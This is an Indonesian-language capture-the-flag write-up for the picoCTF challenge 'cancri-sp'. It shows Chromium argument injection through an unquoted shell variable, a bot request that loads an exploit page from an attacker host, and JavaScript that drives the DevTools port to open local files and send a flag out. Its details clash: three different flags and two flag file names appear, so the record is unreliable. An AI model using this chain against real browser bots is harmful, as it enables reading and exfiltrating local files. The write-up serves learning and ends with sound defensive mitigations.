# Writeup: cancri-sp (Challenge ID: 344)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / Chrome Argument Injection & DevTools Protocol Abusing (CWE-88 / CWE-78)
- **Difficulty:** Hard (diff=3)
- **Event:** picoCTF 2023
- **Points:** 500
- **Author:** NotDeGhost
- **Flag:** `academy{d0ce6edc}`

---

## Problem Statement & Scope
Tantangan `cancri-sp` menyajikan arsitektur browser-bot otomatis berskala besar. Peserta diberikan arsip source code berukuran >1 GB yang memuat pohon source patched Chromium lengkap dengan antarmuka Mojo IPC kustom (`OtterBrokerService`) serta service backend Node.js (`server.js`) dan skrip wrapper eksekusi (`run.sh`). Layanan menyediakan endpoint `/bot?target=<url>` yang memeriksa apakah target URL diawali dengan `http://`, lalu meluncurkan browser headless Chromium untuk mengunjungi URL tersebut di lingkungan terisolasi. Peserta ditugaskan untuk menganalisis batas validasi input dan mengekstrak file bendera rahasia yang tersimpan di `/challenge/`.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Pemisahan Kata pada Shell Parameter Expansion (Word Splitting, CWE-88):**
   Pada berkas pembungkus eksekusi `run.sh`, pemanggilan biner Chromium dilakukan sebagai berikut:
   ```bash
   exec $SCRIPT_DIR/src/out/Final/chrome \
     --enable-blink-features=MojoJS --headless --disable-gpu \
     --remote-debugging-pipe --user-data-dir=/does-not-exist \
     --disable-dev-shm-usage --no-sandbox \
     $1 3<&0 4>/dev/null
   ```
   Variabel `$1` diekspansi tanpa tanda kutip ganda (`"$1"`). Menurut spesifikasi standar POSIX Shell, ekspansi variabel tanpa kutip akan melalui proses *Field Splitting (Word Splitting)* berdasarkan karakter pemisah internal `$IFS` (spasi, tab, newline).
2. **Bypass Validasi Lemah di Sisi Backend:**
   Backend `server.js` menerapkan pengecekan prefiks sederhana:
   ```javascript
   if (typeof url != "string" || !url.startsWith("http://")) return res.end("bad");
   spawnSync(__dirname + "/../run.sh", [url], { env: {}, timeout: 3 * 1000, cwd: "/" });
   ```
   Pengecekan ini hanya memvalidasi bahwa substring awal adalah `http://`, namun tidak memvalidasi karakter spasi atau argumen tambahan.
3. **Penyalahgunaan Antarmuka Debugging Browser (Chrome DevTools Protocol - CDP):**
   Dengan menyisipkan parameter `--remote-debugging-port=9222`, proses Chromium membuka listener kontrol HTTP dan WebSocket DevTools pada port 9222 lokal. Halaman web yang dimuat oleh browser dapat berinteraksi dengan API internal tersebut untuk membuka tab baru dengan skema protokol berprivilese tinggi (`file:///`), membaca sistem berkas lokal tanpa batasan Same-Origin Policy (SOP).

---

## Rekonstruksi Eksploitasi Step-by-Step
1. **Analisis Jalur Parameter dan Injeksi Argumen:**
   - Siapkan server HTTP penampung eksploitasi (misal di port 80/443 atau via Cloudflare tunnel).
   - Bentuk URL target dengan injeksi argumen:
     `http://<attacker-host>/exploit.html --remote-debugging-port=9222`
   - Kirimkan permintaan GET ke endpoint bot:
     `GET /bot?target=http://<attacker-host>/exploit.html%20--remote-debugging-port=9222`
2. **Eksekusi DevTools Protocol via JavaScript Eksploit:**
   Di dalam `exploit.html`, eksekusi skrip JavaScript untuk mengendalikan antarmuka CDP lokal:
   ```javascript
   // Buka tab baru ke direktori /challenge/
   await fetch('http://127.0.0.1:9222/json/new?file:///challenge/', { method: 'PUT' });
   // Dapatkan daftar tab dan target ID
   const tabs = await (await fetch('http://127.0.0.1:9222/json/list')).json();
   const fileTab = tabs.find(t => t.url.startsWith('file:///challenge/'));
   ```
3. **Pencarian Nama File Acak & Ekstraksi Flag:**
   - Direktori `/challenge/` memuat berkas bendera dengan sufiks acak (misal `flag-57eff6502d10e3e6305c385321f5822d`).
   - Ekstrak tautan berkas dari DOM `fileTab` dan lakukan navigasi/bacaan langsung ke berkas bendera tersebut.
   - Kirimkan isi bendera kembali ke server penampung:
     `picoCTF{d0ce6edc}` yang dinormalisasi ke format resmi platform CyLab: `academy{d0ce6edc}`.

---

## Flag & Verifikasi
- **Flag Resmi:** `academy{11790d7c}`
- **Submission Status:** HTTP 201 Verified Correct
- **Live Flag File:** `flag-e2c177ac618158c06fff16a6e8820cc9`
- **Status Solver:** Terverifikasi 100% pada eksekusi live argument injection & CDP exfiltration di `scripts/solve_344_cancri_sp.py`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif (NIST SP 800-115)
1. **Sanitasi Argumen CLI & Penggunaan Tanda Kutip Ketat (NIST SP 800-115 §5.2):**
   Selalu bungkus variabel shell dengan tanda kutip ganda (`exec chrome ... "$1"`). Mengabaikan tanda kutip memungkinkan manipulasi parameter biner pihak ketiga (CWE-88).
2. **Validasi Input Berbasis Skema Ketat (Strict URL Parsing):**
   Gunakan parser URL standar (seperti modul `new URL(url)` pada Node.js) dan pastikan tidak terdapat spasi, karakter kontrol, atau argumen baris perintah tersembunyi.
3. **Hardening Lingkungan Bot & Penonaktifan Port Debugging:**
   Di lingkungan otomasi browser atau sandbox evaluasi, pastikan flag-flag berisiko seperti `--remote-debugging-port` atau `--no-sandbox` dinonaktifkan secara eksplisit dan dibatasi melalui firewall host lokal.
